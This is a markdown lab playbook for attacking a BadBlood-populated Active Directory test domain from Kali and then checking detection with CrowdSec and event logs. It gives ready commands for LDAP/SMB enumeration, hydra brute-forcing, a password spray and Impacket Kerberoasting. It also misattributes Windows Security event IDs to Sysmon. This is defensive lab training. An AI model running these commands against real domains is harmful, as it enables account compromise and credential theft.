# Active Directory Attack Playbook (Using BadBlood Users)

## ðŸ› ï¸ **Lab Setup Overview**

- **Target:** Active Directory Server (e.g., Windows Server 2022)
  - IP Address: `192.168.10.50`
  - Domain: `soclab.local`
  - Vulnerable Users: Populated by **BadBlood**

- **Attacker:** Kali Linux (e.g., 2024 Edition)
  - IP Address: `192.168.20.30`

- **Network:** Both machines are connected and pass through **pfSense** for monitoring and CrowdSec integration.

---

## ðŸ“Š **1. Identify BadBlood Users**

### From the Active Directory Server:

Log into the AD server and list the users generated by **BadBlood**:

```powershell
Get-ADUser -Filter * | Select-Object Name, SamAccountName
```

### From the Kali Linux Machine:

Enumerate users via LDAP (replace values accordingly):

```bash
ldapsearch -x -h 192.168.10.50 -D "user@soclab.local" -W -b "dc=soclab,dc=local"
```

âœ… **Objective:** Identify target users with weak or known passwords.

---

## ðŸ” **2. Enumerate Active Directory (LDAP/SMB)**

### Using **enum4linux**

```bash
enum4linux -a 192.168.10.50
```

### Using **rpcclient** (SMB enumeration)

```bash
rpcclient -U "guest" 192.168.10.50
```

List available users:

```bash
querydispinfo
```

âœ… **Objective:** Gather information about domain users, shares, and policies.

---

## ðŸ”‘ **3. Brute-Force AD Accounts**

### SMB Brute-Force (Weak Passwords)

```bash
hydra -L /usr/share/wordlists/common_users.txt -P /usr/share/wordlists/rockyou.txt smb://192.168.10.50
```

### LDAP Brute-Force

```bash
hydra -L /usr/share/wordlists/common_users.txt -P /usr/share/wordlists/rockyou.txt ldap://192.168.10.50
```

âœ… **Objective:** Identify vulnerable accounts with weak passwords.

---

## ðŸ“œ **4. Password Spray Attack**

Simulate a slow password spray (avoid account lockout):

```bash
crackmapexec smb 192.168.10.50 -u /usr/share/wordlists/common_users.txt -p Welcome2024
```

âœ… **Objective:** Detect users with predictable passwords without triggering lockout.

---

## ðŸŽ­ **5. Kerberoasting Attack (Steal Service Account Hashes)**

Ensure **Impacket** is installed:

```bash
sudo apt install python3-impacket
```

Run the **Kerberoasting** attack:

```bash
GetUserSPNs.py soclab.local/user:Password123 -request
```

âœ… **Objective:** Extract service account hashes for offline cracking.

---

## ðŸ“Š **6. Analyze Detection (CrowdSec + Sysmon + Windows Event Logs)**

1. **Sysmon (Windows)**:
    - Event ID **4625**: Failed Logon Attempts
    - Event ID **4769**: Kerberos TGS Requests

2. **CrowdSec Alerts**:
    - Monitor the dashboard for IP bans.
    - Check active decisions:

    ```bash
    sudo cscli decisions list
    ```

3. **Windows Event Viewer**:
    - Security > Audit Failure (Event ID 4625, 4740)

âœ… **Objective:** Confirm detection and analyze attack visibility.

---

## ðŸš€ **7. Next Steps**

- Perform **Lateral Movement** (e.g., **Pass-the-Hash**).
- Test **LDAP Injection** and privilege escalation.
- Monitor logs for **CrowdSec bans** and firewall blocks.

Do you want to dive deeper into a specific attack or monitor additional logs?

